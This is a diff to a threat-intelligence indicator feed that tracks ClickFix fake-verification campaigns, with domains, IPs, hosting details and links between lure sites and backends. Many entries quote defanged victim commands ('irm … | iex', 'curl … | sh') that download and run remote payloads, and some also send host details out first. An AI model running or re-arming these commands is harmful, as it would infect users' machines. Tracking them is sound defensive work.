@@ -5,7 +5,7 @@
   "short": "Fake checks that get victims to paste and run a command",
   "summary": "A fake CAPTCHA, browser update or error message, usually injected into a hacked legitimate website, copies a command to the clipboard and tells the victim to paste it into the Run dialog, a terminal or PowerShell. The command downloads and runs malware, typically an information stealer or a remote-access tool. Some campaigns fetch their next stage from a public blockchain so the hacked site never has to change."
  },
- "count": 5572,
+ "count": 5571,
  "indicators": [
   {
    "indicator": "06services.it",
@@ -6392,6 +6392,7 @@
    "actor": null,
    "actor_link": null,
    "commands": [
+    "IRM gitlab[.]com/amber-ffa-f15a6b/01a1d97c-7e9c-7284-b3eb-[id]/-/raw/main/01a1d97d-288d-732b-a8c2-[id] | IEX",
     "IRM fastly[.]jsdelivr[.]net/g\"h\"/608-B8D3-712Fc1654E/2368-45ea-b165-[id]/80ee-[id] | IEX"
    ],
    "connects_to": [],
@@ -10870,7 +10871,7 @@
    "product": null,
    "hosting": "Cloudflare (proxied)",
    "dns": "Namecheap",
-   "ip": "141.193.213.11",
+   "ip": "141.193.213.10",
    "asn": "AS209242",
    "org": "CLOUDFLARESPECTRUM Cloudflare London, LLC, US",
    "country": "US",
@@ -12697,7 +12698,9 @@
    "lure_from": [
     "govrobczxc.cc",
     "fudcomcheck.art",
-    "fcdnbovres.cc"
+    "fcdnbovres.cc",
+    "webrtwtre22.cc",
+    "webffoo002.cc"
    ]
   },
   {
@@ -13597,9 +13600,9 @@
    ],
    "lure_from": [
     "fudcomcheck.art",
+    "fcdnbovres.cc",
     "checkogosdfg33.cc",
-    "govrobczxc.cc",
-    "fcdnbovres.cc"
+    "govrobczxc.cc"
    ]
   },
   {
@@ -14025,61 +14028,6 @@
    ],
    "connects_to": [],
    "lure_from": []
-  },
-  {
-   "indicator": "affiliadds.com",
-   "type": "domain",
-   "category": "clickfix",
-   "backend_for": null,
-   "campaign": null,
-   "role": "Phishing page",
-   "status": "online",
-   "first_seen": "2026-10-30",
-   "last_seen": "2026-10-31",
-   "last_online": "2026-11-15",
-   "offline_since": null,
-   "url": "https://affiliadds.com/",
-   "brand": null,
-   "product": null,
-   "hosting": "Hostinger",
-   "dns": "dns-parking.com",
-   "ip": "2a02:4780:84:8563:1749:98c:6716:d673",
-   "asn": "AS47583",
-   "org": "AS-HOSTINGER Hostinger International Limited, CY",
-   "country": "CY",
-   "ips": [
-    {
-     "ip": "2a02:4780:84:8563:1749:98c:6716:d673",
-     "asn": "AS47583",
-     "org": "AS-HOSTINGER Hostinger International Limited, CY",
-     "first_seen": "2026-10-30",
-     "last_seen": "2026-10-31"
-    }
-   ],
-   "hosts": [
-    {
-     "host": "affiliadds.com",
-     "status": "online",
-     "first_seen": "2026-10-30",
-     "last_seen": "2026-10-31"
-    }
-   ],
-   "actor": null,
-   "actor_link": null,
-   "commands": [
-    "irm hxxps[:]//ubbrobccheck20[.]cc/cdn/sync/traffic?r=db4f|iex",
-    "<span style=\"white-space:pre\">irm hxxps[:]//ubbrobccheck20[.]cc/cdn/sync/traffic?r=db4f|iex</span>",
-    "irm hxxps[:]//ubbrobccheck20[.]cc/cdn/sync/traffic?r=04fd|iex"
-   ],
-   "connects_to": [
-    "ubbrobccheck20.cc"
-   ],
-   "lure_from": [
-    "verifyidentrob01.cc",
-    "checkogosdfg33.cc",
-    "govrobczxc.cc",
-    "fudcomcheck.art"
-   ]
   },
   {
    "indicator": "affordableindividualhealthcare.com",
@@ -16929,7 +16877,7 @@
    "product": null,
    "hosting": "Cloudflare (proxied)",
    "dns": "Cloudflare",
-   "ip": "188.114.97.3",
+   "ip": "188.114.96.3",
    "asn": "AS13335",
    "org": "CLOUDFLARENET - Cloudflare, Inc., US",
    "country": null,
@@ -24733,6 +24681,61 @@
    ],
    "lure_from": [
     "ncheck-brows.beer"
+   ]
+  },
+  {
+   "indicator": "anti-gravity.com",
+   "type": "domain",
+   "category": "clickfix",
+   "backend_for": null,
+   "campaign": null,
+   "role": "Redirector",
+   "status": "online",
+   "first_seen": "2026-10-29",
+   "last_seen": "2026-10-31",
+   "last_online": "2026-11-15",
+   "offline_since": null,
+   "url": "https://www.anti-gravity.com/",
+   "brand": null,
+   "product": null,
+   "hosting": "Cloudflare (proxied)",
+   "dns": "Cloudflare",
+   "ip": "172.67.196.129",
+   "asn": "AS13335",
+   "org": "Cloudflare, Inc.",
+   "country": "US",
+   "ips": [
+    {
+     "ip": "172.67.196.129",
+     "asn": "AS13335",
+     "org": "Cloudflare, Inc.",
+     "first_seen": "2026-10-29",
+     "last_seen": "2026-10-31"
+    }
+   ],
+   "hosts": [
+    {
+     "host": "www.anti-gravity.com",
+     "status": "online",
+     "first_seen": "2026-10-29",
+     "last_seen": "2026-10-31"
+    }
+   ],
+   "actor": null,
+   "actor_link": null,
+   "commands": [
+    "(irm 'hxxp[:]//hagosuro[.]lc/dantestraff18/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'})|iex",
+    "(irm 'hxxps[:]//t-trustrest[.]com/dan_proliv/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|iex",
+    "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/dan_proliv' >/dev/null"
+   ],
+   "connects_to": [
+    "hagosuro.lc",
+    "t-trustrest.com",
+    "xorados.com",
+    "trek-72.com"
+   ],
+   "lure_from": [
+    "interseq.at"
    ]
   },
   {
@@ -54871,6 +54874,13 @@
    "country": null,
    "ips": [
     {
+     "ip": "104.21.5.216",
+     "asn": "AS13335",
+     "org": "CLOUDFLARENET - Cloudflare, Inc., US",
+     "first_seen": "2026-11-15",
+     "last_seen": "2026-11-15"
+    },
+    {
      "ip": "172.67.133.223",
      "asn": "AS13335",
      "org": "CLOUDFLARENET - Cloudflare, Inc., US",
@@ -62447,11 +62457,18 @@
    "product": null,
    "hosting": "Cloudflare (proxied)",
    "dns": "Cloudflare",
-   "ip": "188.114.97.3",
+   "ip": "188.114.96.3",
    "asn": "AS13335",
    "org": "CLOUDFLARENET - Cloudflare, Inc., US",
    "country": null,
    "ips": [
+    {
+     "ip": "104.21.24.224",
+     "asn": "AS13335",
+     "org": "CLOUDFLARENET - Cloudflare, Inc., US",
+     "first_seen": "2026-11-15",
+     "last_seen": "2026-11-15"
+    },
     {
      "ip": "172.67.220.225",
      "asn": "AS13335",
@@ -62675,7 +62692,7 @@
    "product": null,
    "hosting": "Cloudflare (proxied)",
    "dns": "Cloudflare",
-   "ip": "2a06:98c1:3121::3",
+   "ip": "188.114.97.3",
    "asn": "AS13335",
    "org": "CLOUDFLARENET - Cloudflare, Inc., US",
    "country": null,
@@ -74115,23 +74132,23 @@
    "product": null,
    "hosting": "OVHcloud",
    "dns": "OVH",
-   "ip": "145.239.37.162",
+   "ip": "2001:41d0:301::30",
    "asn": "AS16276",
    "org": "OVH OVH SAS, FR",
    "country": "FR",
    "ips": [
     {
-     "ip": "145.239.37.162",
-     "asn": "AS16276",
-     "org": "OVH OVH SAS, FR",
-     "first_seen": "2026-11-11",
-     "last_seen": "2026-11-15"
-    },
-    {
      "ip": "2001:41d0:301::30",
      "asn": "AS16276",
      "org": "OVH OVH SAS, FR",
      "first_seen": "2026-11-13",
+     "last_seen": "2026-11-15"
+    },
+    {
+     "ip": "145.239.37.162",
+     "asn": "AS16276",
+     "org": "OVH OVH SAS, FR",
+     "first_seen": "2026-11-11",
      "last_seen": "2026-11-15"
     }
    ],
@@ -76297,7 +76314,7 @@
    "last_seen": "2026-11-15",
    "last_online": "2026-11-15",
    "offline_since": null,
-   "url": "http://cruisevacationhq.com/",
+   "url": "https://cruisevacationhq.com/",
    "brand": null,
    "product": null,
    "hosting": "Cloudflare (proxied)",
@@ -105493,23 +105510,23 @@
    "product": null,
    "hosting": "AS Infomaniak Network SA",
    "dns": "infomaniak.ch",
-   "ip": "2001:1600:4:13:1a66:daff:fe6e:5b8c",
+   "ip": "83.166.138.113",
    "asn": "AS29222",
    "org": "Infomaniak-AS Infomaniak Network SA, CH",
    "country": "CH",
    "ips": [
     {
-     "ip": "2001:1600:4:13:1a66:daff:fe6e:5b8c",
-     "asn": "AS29222",
-     "org": "Infomaniak-AS Infomaniak Network SA, CH",
-     "first_seen": "2026-10-23",
-     "last_seen": "2026-11-15"
-    },
-    {
      "ip": "83.166.138.113",
      "asn": "AS29222",
      "org": "Infomaniak-AS Infomaniak Network SA, CH",
      "first_seen": "2026-10-18",
+     "last_seen": "2026-11-15"
+    },
+    {
+     "ip": "2001:1600:4:13:1a66:daff:fe6e:5b8c",
+     "asn": "AS29222",
+     "org": "Infomaniak-AS Infomaniak Network SA, CH",
+     "first_seen": "2026-10-23",
      "last_seen": "2026-11-15"
     }
    ],
@@ -107507,72 +107524,6 @@
    ],
    "lure_from": [
     "interseq.at"
-   ]
-  },
-  {
-   "indicator": "fia-tech.com",
-   "type": "domain",
-   "category": "clickfix",
-   "backend_for": null,
-   "campaign": null,
-   "role": "Phishing page",
-   "status": "online",
-   "first_seen": "2026-11-07",
-   "last_seen": "2026-11-15",
-   "last_online": "2026-11-15",
-   "offline_since": null,
-   "url": "https://fia-tech.com/",
-   "brand": null,
-   "product": null,
-   "hosting": "Fastly",
-   "dns": "dnsmadeeasy.com",
-   "ip": "2620:12a:8000::1",
-   "asn": "AS54113",
-   "org": "FASTLY - Fastly, Inc., US",
-   "country": "US",
-   "ips": [
-    {
-     "ip": "2620:12a:8000::1",
-     "asn": "AS54113",
-     "org": "FASTLY - Fastly, Inc., US",
-     "first_seen": "2026-11-08",
-     "last_seen": "2026-11-15"
-    },
-    {
-     "ip": "23.185.0.1",
-     "asn": "AS54113",
-     "org": "FASTLY - Fastly, Inc., US",
-     "first_seen": "2026-11-07",
-     "last_seen": "2026-11-12"
-    },
-    {
-     "ip": "2620:12a:8001::1",
-     "asn": "AS54113",
-     "org": "FASTLY - Fastly, Inc., US",
-     "first_seen": "2026-11-07",
-     "last_seen": "2026-11-12"
-    }
-   ],
-   "hosts": [
-    {
-     "host": "fia-tech.com",
-     "status": "online",
-     "first_seen": "2026-11-07",
-     "last_seen": "2026-11-15"
-    }
-   ],
-   "actor": "dprk",
-   "actor_link": "linked",
-   "commands": [
-    "curl -sL -d \"id=cf04a4d3-7988-4568-b819-[id]&location=America%2FNew_York%20%7C%20en-US&siteUrl=https%3A%2F%2Ffia-tech.com%2F&os=Mac%2015&lastVisitAt=2026-11-07T13%3A12%3A23.226Z&lastShellAt=2026-11-07T13%3A12%3A23.226Z\" \"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\" && curl -s 'hxxps[:]//script-six-tawny[.]vercel[.]app/mac' -L | sh",
-    "powershell -w h \"iex(irm 'fingerprint-veri[.]info/[id]'); Start-Sleep -Seconds 30\"; exit",
-    "cmd.exe /c \"curl.exe -sL -d \"\"id=a798adfb-7e25-47e7-930e-[id]\"\" -d \"\"location=America%2FNew_York%20%7C%20en-US\"\" -d \"\"siteUrl=https%3A%2F%2Ffia-tech.com%2F\"\" -d \"\"os=win11\"\" -d \"\"lastVisitAt=2026-11-07T13%3A09%3A52.264Z\"\" -d \"\"lastShellAt=2026-11-07T13%3A09%3A52.264Z\"\" \"\"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\"\" & curl.exe -s hxxps[:]//script-six-tawny[.]vercel[.]app/win -L | cmd\""
-   ],
-   "connects_to": [
-    "fingerprint-veri.info"
-   ],
-   "lure_from": [
-    "codes.browse-cdn.beer"
    ]
   },
   {
@@ -113644,12 +113595,15 @@
    "commands": [
     "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/proliv2929' >/dev/null",
     "(irm 'hxxps[:]//t-trustrest[.]com/proliv2929/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|iex",
-    "(irm 'hxxps[:]//trustchecknes[.]com/proliv2929/[id]')|iex"
+    "curl -sL -d \"id=983a1f6f-436a-463b-983b-[id]&location=America%2FNew_York%20%7C%20en-US&siteUrl=https%3A%2F%2Ffullpowerproperties.uk%2F&os=Mac%2015&lastVisitAt=2026-11-15T21%3A44%3A17.077Z&lastShellAt=2026-11-15T21%3A44%3A17.077Z\" \"hxxps[:]//script[.]google[.]com/macros/s/AKfycbwR4W_Fm4dL82LZC49P_G58-W06_Z_TMez_MEHLaklDe_nTe5wlqlWBsD02XGR-KYIX3A/exec\" && curl -fsSL \"hxxps[:]//softify[.]lat/u/8ecec3ba\" | sh"
    ],
    "connects_to": [
     "xorados.com",
     "groverudder12.com",
     "t-trustrest.com",
+    "softify.lat",
+    "fingerprint-veri.info",
+    "browse-cloud.codes",
     "trustchecknes.com",
     "ncheck-brows.beer",
     "id-verfied.boats",
@@ -113912,6 +113866,7 @@
    "actor_link": null,
    "commands": [
     "IRM fastly[.]jsdelivr[.]net/g\"h\"/Katy7684/1d34ada-114e-43c6-b277-9805448b8Df/BE5-4532-a7E5-AE1a29 | IEX",
+    "IRM gitlab[.]com/amber-ffa-f15a6b/01a1db1b-d21d-70c0-971b-[id]/-/raw/main/01a1db1b-d21d-70c0-971b-[id] | IEX",
     "IRM fastly[.]jsdelivr[.]net/g\"h\"/sdf4563jvn/[id]/a379-[id] | IEX"
    ],
    "connects_to": [],
@@ -131037,54 +130992,6 @@
    "lure_from": [
     "interseq.at"
    ]
-  },
-  {
-   "indicator": "hecherhaus.at",
-   "type": "domain",
-   "category": "clickfix",
-   "backend_for": null,
-   "campaign": null,
-   "role": "Phishing page",
-   "status": "online",
-   "first_seen": "2026-10-31",
-   "last_seen": "2026-11-01",
-   "last_online": "2026-11-15",
-   "offline_since": null,
-   "url": "https://hecherhaus.at/",
-   "brand": null,
-   "product": null,
-   "hosting": "EU EDIS GmbH",
-   "dns": "edis.global",
-   "ip": "91.227.205.222",
-   "asn": "AS57169",
-   "org": "EDIS-AS-EU EDIS GmbH, AT",
-   "country": "AT",
-   "ips": [
-    {
-     "ip": "91.227.205.222",
-     "asn": "AS57169",
-     "org": "EDIS-AS-EU EDIS GmbH, AT",
-     "first_seen": "2026-10-31",
-     "last_seen": "2026-11-01"
-    }
-   ],
-   "hosts": [
-    {
-     "host": "hecherhaus.at",
-     "status": "online",
-     "first_seen": "2026-10-31",
-     "last_seen": "2026-11-01"
-    }
-   ],
-   "actor": null,
-   "actor_link": null,
-   "commands": [
-    "irm 'ncheck-brows[.]beer/[id]'|iex"
-   ],
-   "connects_to": [
-    "ncheck-brows.beer"
-   ],
-   "lure_from": []
   },
   {
    "indicator": "heldenlauf.at",
@@ -174426,7 +174333,7 @@
    "product": null,
    "hosting": "Cloudflare (proxied)",
    "dns": "Cloudflare",
-   "ip": "188.114.97.3",
+   "ip": "188.114.96.3",
    "asn": "AS13335",
    "org": "CLOUDFLARENET - Cloudflare, Inc., US",
    "country": null,
@@ -177246,7 +177153,7 @@
    "product": null,
    "hosting": "Cloudflare (proxied)",
    "dns": "Cloudflare",
-   "ip": "188.114.97.3",
+   "ip": "104.21.55.130",
    "asn": "AS13335",
    "org": "CLOUDFLARENET - Cloudflare, Inc., US",
    "country": null,
@@ -177274,6 +177181,13 @@
     },
     {
      "ip": "188.114.97.3",
+     "asn": "AS13335",
+     "org": "CLOUDFLARENET - Cloudflare, Inc., US",
+     "first_seen": "2026-11-15",
+     "last_seen": "2026-11-15"
+    },
+    {
+     "ip": "2606:4700:3037::ac43:942e",
      "asn": "AS13335",
      "org": "CLOUDFLARENET - Cloudflare, Inc., US",
      "first_seen": "2026-11-15",
@@ -186830,11 +186744,11 @@
     "thu-ipad-03.cfd",
     "nikogdatakonebilo.cc",
     "efreitorher.org",
+    "biboiboboorl.org",
     "yaebalciganovvjopu.org",
     "pizdalisibivet.org",
     "japlukarmore.org",
-    "ciganshina.org",
-    "pakistanskimalchik.org"
+    "ciganshina.org"
    ]
   },
   {
@@ -189898,6 +189812,7 @@
    "actor": null,
    "actor_link": null,
    "commands": [
+    "IRM gitlab[.]com/amber-ffa-f15a6b/01a1db1b-d21d-70c0-971b-[id]/-/raw/main/01a1db1b-d21d-70c0-971b-[id] | IEX",
     "IRM fastly[.]jsdelivr[.]net/g\"h\"/sdf4563jvn/[id]/a379-[id] | IEX"
    ],
    "connects_to": [],
@@ -192649,6 +192564,7 @@
     "interseq.at",
     "nikogdatakonebilo.cc",
     "efreitorher.org",
+    "biboiboboorl.org",
     "yaebalciganovvjopu.org",
     "pizdalisibivet.org",
     "japlukarmore.org",
@@ -206338,7 +206254,7 @@
    "product": null,
    "hosting": "Cloudflare (proxied)",
    "dns": "Cloudflare",
-   "ip": "188.114.97.3",
+   "ip": "104.21.3.234",
    "asn": "AS13335",
    "org": "CLOUDFLARENET - Cloudflare, Inc., US",
    "country": null,
@@ -219784,6 +219700,7 @@
     "copiose.org"
    ],
    "lure_from": [
+    "biboiboboorl.org",
     "yaponovosh.org",
     "efreitorher.org",
     "nikogdatakonebilo.cc"
@@ -225616,6 +225533,7 @@
    "lure_from": [
     "mon-blanc-02.cfd",
     "thu-ipad-03.cfd",
+    "biboiboboorl.org",
     "yaponovosh.org",
     "efreitorher.org",
     "nikogdatakonebilo.cc"
@@ -226108,6 +226026,7 @@
    "actor_link": null,
    "commands": [
     "IRM fastly[.]jsdelivr[.]net/g\"h\"/Katy7684/76-51fd-42c5-8717-[id]/10-9B-D0-8D-B2-CB | IEX",
+    "IRM gitlab[.]com/amber-ffa-f15a6b/01a1db1b-d21d-70c0-971b-[id]/-/raw/main/01a1db1b-d21d-70c0-971b-[id] | IEX",
     "IRM fastly[.]jsdelivr[.]net/g\"h\"/sdf4563jvn/[id]/a379-[id] | IEX"
    ],
    "connects_to": [],
@@ -226726,6 +226645,7 @@
    "actor_link": null,
    "commands": [
     "IRM fastly[.]jsdelivr[.]net/g\"h\"/Katy7684/76-51fd-42c5-8717-[id]/10-9B-D0-8D-B2-CB | IEX",
+    "IRM gitlab[.]com/amber-ffa-f15a6b/01a1db1b-d21d-70c0-971b-[id]/-/raw/main/01a1db1b-d21d-70c0-971b-[id] | IEX",
     "IRM fastly[.]jsdelivr[.]net/g\"h\"/sdf4563jvn/[id]/a379-[id] | IEX"
    ],
    "connects_to": [],
@@ -227763,10 +227683,11 @@
    "actor_link": null,
    "commands": [
     "IRM fastly[.]jsdelivr[.]net/g\"h\"/Katy7684/76-51fd-42c5-8717-[id]/10-9B-D0-8D-B2-CB | IEX",
-    "/bin/bash -c \"$(curl -A 'Mac OS X 10_15_7' -fsSL '5eb47skp[.]esmaymedia[.]com/?ublib=cf3a6e2b-9486-4ace-bed5-[id]')\"; echo \"\"BotGuard: Answer the protector challenge. Ref: 73282",
-    "IRM fastly[.]jsdelivr[.]net/g\"h\"/sdf4563jvn/[id]/a379-[id] | IEX"
+    "/bin/bash -c \"$(curl -A 'Mac OS X 10_15_7' -fsSL '1qa51nrj[.]udap[.]store/?ublib=56a15404-f53b-4728-9800-[id]')\"; echo \"\"BotGuard: Answer the protector challenge. Ref: 73282",
+    "IRM gitlab[.]com/amber-ffa-f15a6b/01a1db1b-d21d-70c0-971b-[id]/-/raw/main/01a1db1b-d21d-70c0-971b-[id] | IEX"
    ],
    "connects_to": [
+    "1qa51nrj.udap.store",
     "5eb47skp.esmaymedia.com"
    ],
    "lure_from": []
@@ -232858,9 +232779,12 @@
    "actor_link": null,
    "commands": [
     "IRM fastly[.]jsdelivr[.]net/g\"h\"/Katy7684/76-51fd-42c5-8717-[id]/10-9B-D0-8D-B2-CB | IEX",
-    "IRM fastly[.]jsdelivr[.]net/g\"h\"/sdf4563jvn/[id]/a379-[id] | IEX"
+    "/bin/bash -c \"$(curl -A 'Mac OS X 10_15_7' -fsSL 'g4os1xlf[.]udap[.]store/?ublib=0cde8ced-80ce-442a-8e43-[id]')\"; echo \"\"BotGuard: Answer the protector challenge. Ref: 73282",
+    "IRM gitlab[.]com/amber-ffa-f15a6b/01a1db1b-d21d-70c0-971b-[id]/-/raw/main/01a1db1b-d21d-70c0-971b-[id] | IEX"
    ],
-   "connects_to": [],
+   "connects_to": [
+    "g4os1xlf.udap.store"
+   ],
    "lure_from": []
   },
   {
@@ -237002,10 +236926,12 @@
    "actor": null,
    "actor_link": null,
    "commands": [
-    "/bin/bash -c \"$(curl -A 'Mac OS X 10_15_7' -fsSL 'afl8u0uh[.]marya[.]store/?ublib=d4140e78-93c8-44ad-9c6e-[id]')\"; echo \"\"BotGuard: Answer the protector challenge. Ref: 73282",
-    "IRM fastly[.]jsdelivr[.]net/g\"h\"/sdf4563jvn/[id]/a379-[id] | IEX"
+    "/bin/bash -c \"$(curl -A 'Mac OS X 10_15_7' -fsSL 'pezhx5sq[.]udap[.]store/?ublib=53282a22-9bcd-4cbe-9b18-[id]')\"; echo \"\"BotGuard: Answer the protector challenge. Ref: 73282",
+    "IRM gitlab[.]com/amber-ffa-f15a6b/01a1db1b-d21d-70c0-971b-[id]/-/raw/main/01a1db1b-d21d-70c0-971b-[id] | IEX",
+    "/bin/bash -c \"$(curl -A 'Mac OS X 10_15_7' -fsSL 'afl8u0uh[.]marya[.]store/?ublib=d4140e78-93c8-44ad-9c6e-[id]')\"; echo \"\"BotGuard: Answer the protector challenge. Ref: 73282"
    ],
    "connects_to": [
+    "pezhx5sq.udap.store",
     "afl8u0uh.marya.store"
    ],
    "lure_from": []
@@ -239153,12 +239079,13 @@
     "(irm 'hxxps[:]//t-trustrest[.]com/dan_proliv/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|iex"
    ],
    "connects_to": [
+    "hagosuro.lc",
     "xorados.com",
     "trek-72.com",
-    "hagosuro.lc",
     "t-trustrest.com",
     "t-trustresnew.com",
-    "trustchecknes.com"
+    "trustchecknes.com",
+    "lepafonso.bz"
    ],
    "lure_from": [
     "interseq.at",
@@ -239857,6 +239784,7 @@
    "actor_link": null,
    "commands": [
     "IRM fastly[.]jsdelivr[.]net/g\"h\"/Katy7684/76-51fd-42c5-8717-[id]/10-9B-D0-8D-B2-CB | IEX",
+    "IRM gitlab[.]com/amber-ffa-f15a6b/01a1db1b-d21d-70c0-971b-[id]/-/raw/main/01a1db1b-d21d-70c0-971b-[id] | IEX",
     "IRM fastly[.]jsdelivr[.]net/g\"h\"/sdf4563jvn/[id]/a379-[id] | IEX"
    ],
    "connects_to": [],
@@ -239903,10 +239831,12 @@
    "actor": null,
    "actor_link": null,
    "commands": [
-    "/bin/bash -c \"$(curl -A 'Mac OS X 10_15_7' -fsSL 'evghtbq6[.]marya[.]store/?ublib=69dbd354-784f-4722-a247-[id]')\"; echo \"\"BotGuard: Answer the protector challenge. Ref: 73282",
-    "IRM fastly[.]jsdelivr[.]net/g\"h\"/sdf4563jvn/[id]/a379-[id] | IEX"
+    "/bin/bash -c \"$(curl -A 'Mac OS X 10_15_7' -fsSL 'pabpn9x5[.]udap[.]store/?ublib=d0ef503c-bf02-4776-a1fa-[id]')\"; echo \"\"BotGuard: Answer the protector challenge. Ref: 73282",
+    "IRM gitlab[.]com/amber-ffa-f15a6b/01a1db1b-d21d-70c0-971b-[id]/-/raw/main/01a1db1b-d21d-70c0-971b-[id] | IEX",
+    "/bin/bash -c \"$(curl -A 'Mac OS X 10_15_7' -fsSL 'evghtbq6[.]marya[.]store/?ublib=69dbd354-784f-4722-a247-[id]')\"; echo \"\"BotGuard: Answer the protector challenge. Ref: 73282"
    ],
    "connects_to": [
+    "pabpn9x5.udap.store",
     "evghtbq6.marya.store"
    ],
    "lure_from": []
@@ -240433,6 +240363,7 @@
    "actor_link": null,
    "commands": [
     "IRM fastly[.]jsdelivr[.]net/g\"h\"/Katy7684/76-51fd-42c5-8717-[id]/10-9B-D0-8D-B2-CB | IEX",
+    "IRM gitlab[.]com/amber-ffa-f15a6b/01a1db1b-d21d-70c0-971b-[id]/-/raw/main/01a1db1b-d21d-70c0-971b-[id] | IEX",
     "IRM fastly[.]jsdelivr[.]net/g\"h\"/sdf4563jvn/[id]/a379-[id] | IEX"
    ],
    "connects_to": [],
@@ -240954,10 +240885,11 @@
    "actor_link": null,
    "commands": [
     "IRM fastly[.]jsdelivr[.]net/g\"h\"/Katy7684/1d34ada-114e-43c6-b277-9805448b8Df/BE5-4532-a7E5-AE1a29 | IEX",
-    "/bin/bash -c \"$(curl -A 'Mac OS X 10_15_7' -fsSL '4wxs2hrh[.]lochnesshunters[.]com/?ublib=6f9e82bc-d525-499a-ae57-[id]')\"; echo \"\"BotGuard: Answer the protector challenge. Ref: 73282",
-    "IRM fastly[.]jsdelivr[.]net/g\"h\"/sdf4563jvn/[id]/a379-[id] | IEX"
+    "/bin/bash -c \"$(curl -A 'Mac OS X 10_15_7' -fsSL 'qbcm20fr[.]udap[.]store/?ublib=7514d42c-30bd-4cdd-aa6f-[id]')\"; echo \"\"BotGuard: Answer the protector challenge. Ref: 73282",
+    "IRM gitlab[.]com/amber-ffa-f15a6b/01a1db1b-d21d-70c0-971b-[id]/-/raw/main/01a1db1b-d21d-70c0-971b-[id] | IEX"
    ],
    "connects_to": [
+    "qbcm20fr.udap.store",
     "4wxs2hrh.lochnesshunters.com"
    ],
    "lure_from": []
@@ -247243,6 +247175,7 @@
    "actor_link": null,
    "commands": [
     "IRM fastly[.]jsdelivr[.]net/g\"h\"/Katy7684/1d34ada-114e-43c6-b277-9805448b8Df/BE5-4532-a7E5-AE1a29 | IEX",
+    "IRM gitlab[.]com/amber-ffa-f15a6b/01a1db1b-d21d-70c0-971b-[id]/-/raw/main/01a1db1b-d21d-70c0-971b-[id] | IEX",
     "IRM fastly[.]jsdelivr[.]net/g\"h\"/sdf4563jvn/[id]/a379-[id] | IEX"
    ],
    "connects_to": [],
@@ -247979,6 +247912,7 @@
    "actor": null,
    "actor_link": null,
    "commands": [
+    "IRM gitlab[.]com/amber-ffa-f15a6b/01a1db1b-d21d-70c0-971b-[id]/-/raw/main/01a1db1b-d21d-70c0-971b-[id] | IEX",
     "IRM fastly[.]jsdelivr[.]net/g\"h\"/sdf4563jvn/[id]/a379-[id] | IEX"
    ],
    "connects_to": [],
@@ -251374,10 +251308,12 @@
    "actor": null,
    "actor_link": null,
    "commands": [
-    "/bin/bash -c \"$(curl -A 'Mac OS X 10_15_7' -fsSL '2fq3t86f[.]marya[.]store/?ublib=1ac04af0-bf53-474f-891b-[id]')\"; echo \"\"BotGuard: Answer the protector challenge. Ref: 73282",
-    "IRM fastly[.]jsdelivr[.]net/g\"h\"/sdf4563jvn/[id]/a379-[id] | IEX"
+    "/bin/bash -c \"$(curl -A 'Mac OS X 10_15_7' -fsSL 'tauih2be[.]udap[.]store/?ublib=872a6ba5-8309-460d-9359-[id]')\"; echo \"\"BotGuard: Answer the protector challenge. Ref: 73282",
+    "IRM gitlab[.]com/amber-ffa-f15a6b/01a1db1b-d21d-70c0-971b-[id]/-/raw/main/01a1db1b-d21d-70c0-971b-[id] | IEX",
+    "/bin/bash -c \"$(curl -A 'Mac OS X 10_15_7' -fsSL '2fq3t86f[.]marya[.]store/?ublib=1ac04af0-bf53-474f-891b-[id]')\"; echo \"\"BotGuard: Answer the protector challenge. Ref: 73282"
    ],
    "connects_to": [
+    "tauih2be.udap.store",
     "2fq3t86f.marya.store"
    ],
    "lure_from": []
@@ -251777,6 +251713,7 @@
    "actor": null,
    "actor_link": null,
    "commands": [
+    "IRM gitlab[.]com/amber-ffa-f15a6b/01a1db1b-d21d-70c0-971b-[id]/-/raw/main/01a1db1b-d21d-70c0-971b-[id] | IEX",
     "IRM fastly[.]jsdelivr[.]net/g\"h\"/sdf4563jvn/[id]/a379-[id] | IEX"
    ],
    "connects_to": [],
@@ -252566,10 +252503,11 @@
    "actor_link": null,
    "commands": [
     "IRM fastly[.]jsdelivr[.]net/g\"h\"/Katy7684/1d34ada-114e-43c6-b277-9805448b8Df/BE5-4532-a7E5-AE1a29 | IEX",
-    "/bin/bash -c \"$(curl -A 'Mac OS X 10_15_7' -fsSL 'euqrhfd6[.]lochnesshunters[.]com/?ublib=dd158360-36fa-4ecd-ba44-[id]')\"; echo \"\"BotGuard: Answer the protector challenge. Ref: 73282",
-    "IRM fastly[.]jsdelivr[.]net/g\"h\"/sdf4563jvn/[id]/a379-[id] | IEX"
+    "/bin/bash -c \"$(curl -A 'Mac OS X 10_15_7' -fsSL 'f9nfyykz[.]udap[.]store/?ublib=0d4add55-4baf-462e-b0ca-[id]')\"; echo \"\"BotGuard: Answer the protector challenge. Ref: 73282",
+    "IRM gitlab[.]com/amber-ffa-f15a6b/01a1db1b-d21d-70c0-971b-[id]/-/raw/main/01a1db1b-d21d-70c0-971b-[id] | IEX"
    ],
    "connects_to": [
+    "f9nfyykz.udap.store",
     "euqrhfd6.lochnesshunters.com"
    ],
    "lure_from": []
@@ -254156,9 +254094,12 @@
    "actor_link": null,
    "commands": [
     "IRM fastly[.]jsdelivr[.]net/g\"h\"/Katy7684/1d34ada-114e-43c6-b277-9805448b8Df/BE5-4532-a7E5-AE1a29 | IEX",
-    "IRM fastly[.]jsdelivr[.]net/g\"h\"/sdf4563jvn/[id]/a379-[id] | IEX"
+    "/bin/bash -c \"$(curl -A 'Mac OS X 10_15_7' -fsSL 'bsdbw9j6[.]udap[.]store/?ublib=552f08f4-a125-4a17-ac34-[id]')\"; echo \"\"BotGuard: Answer the protector challenge. Ref: 73282",
+    "IRM gitlab[.]com/amber-ffa-f15a6b/01a1db1b-d21d-70c0-971b-[id]/-/raw/main/01a1db1b-d21d-70c0-971b-[id] | IEX"
    ],
-   "connects_to": [],
+   "connects_to": [
+    "bsdbw9j6.udap.store"
+   ],
    "lure_from": []
   },
   {
